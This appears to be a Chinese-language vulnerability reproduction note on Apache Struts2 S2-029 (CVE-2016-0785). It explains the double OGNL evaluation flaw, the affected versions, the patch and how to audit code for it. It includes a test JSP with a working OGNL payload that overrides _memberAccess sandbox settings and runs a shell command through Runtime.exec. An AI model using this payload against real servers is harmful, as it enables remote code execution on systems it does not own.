<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2016-0785）S2-029</h1><h2>一、漏洞简介</h2><p>代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%{}”。最终造成二次执行。因此需要的条件极为苛刻，特殊的代码，value值为空，可以传参到value，控制name，严格来说应该是个本地漏洞。</p><h2>二、漏洞影响</h2><p>Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）</p><h2>三、复现过程</h2><p>S2-029的公告说是可能的远程代码执行。而且依然是ognl导致的。</p><p>The Apache Struts frameworks performs double evaluation of attributes values assigned to certain tags so it is possible to pass in a value that will be evaluated again when a tag’s attributes will be rendered.</p><p>目前网上已经有一些成熟的参考的资料了。详见文末参考资料。这次的漏洞虽然是代码执行。但是风险不高，需要开发者使用了特定的代码写法才会导致漏洞。需要直接将用户提交的数据通过标签设置成属性值。</p><p>比如：</p><p>&lt;s:i18n name="%&amp;#123#request.lan&amp;#125"&gt;xxxxx&lt;/s:i18n&gt;<br />&lt;set var="%&amp;#123#parameters.tang3&amp;#125"/&gt;</p><p>通过%&amp;#123#&amp;#125的方式获取用户输入放入标签属性，会导致代码执行。struts2的修复方式也是直接过滤了%&amp;#123&amp;#125形式的字符串的ognl解析。</p><p>1.png</p><p>这段代码的修改用来处理掉了非%&amp;#123开头，&amp;#125结尾的字符串进行ognl解析的功能，这里我们来举个例子：bar%&amp;#1232+3&amp;#125，在修改之前的代码中2+3是会被作为ognl执行的。那么修改后，这种形式就只会被当做字符串来返回。</p><p>审计方式就是查看是否有%&amp;#123#&amp;#125这种方式获取用户输入变量复制给标签属性的代码写法。</p><p>测试代码：</p><p>&lt;%@page import="java.util.HashSet"%&gt;<br />&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;<br />&lt;%@ taglib prefix="s" uri="/struts-tags" %&gt;<br />&lt;html&gt;<br />&lt;head&gt;&lt;title&gt;Demo jsp page&lt;/title&gt;&lt;/head&gt;<br />&lt;body&gt;<br />&lt;%<br />  request.setAttribute(&quot;lan&quot;, &quot;'),#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=@java.lang.Runtime@getRuntime(),#a.exec('touch /tmp/1111'),new java.lang.String('&quot;);<br />%&gt;<br />&lt;s:i18n name="%&amp;#123#request.lan&amp;#125"&gt;xxxxx&lt;/s:i18n&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;</p><p>2.png</p><p>查看tmp目录文件已经生成。</p><p>3.png</p></body></html>